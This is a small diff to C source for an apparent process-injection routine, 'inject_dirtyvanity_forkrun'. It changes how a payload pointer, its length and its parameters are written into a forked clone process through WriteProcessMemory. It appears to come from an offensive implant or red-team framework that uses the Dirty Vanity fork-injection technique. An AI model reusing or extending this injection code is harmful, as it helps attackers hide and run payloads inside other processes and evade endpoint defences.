@@ -353,9 +353,14 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 		}
 	}
 
-	mb.go    = 1;
-	mb.entry = (char *)remote + offset; /* job payloads carry their loader offset */
-	mb.param = rparam;
+	mb.go       = 1;
+	mb.payload  = (char *)remote; /* the clone launches the payload at its
+	                               * base (offset-0 convention); job-style
+	                               * offsets are not routed through the
+	                               * nursery - the patsy path keeps those */
+	mb.plen     = dllen;
+	mb.param    = rparam;
+	mb.plen_arg = plen;
 	/* dv_mailbox lives in our image - the clone's inherited copy sits at
 	 * the identical VA (fork preserves the address space) */
 	if (!WriteProcessMemory(hc, &dv_mailbox, &mb, sizeof(mb), &got) || got != sizeof(mb)) {
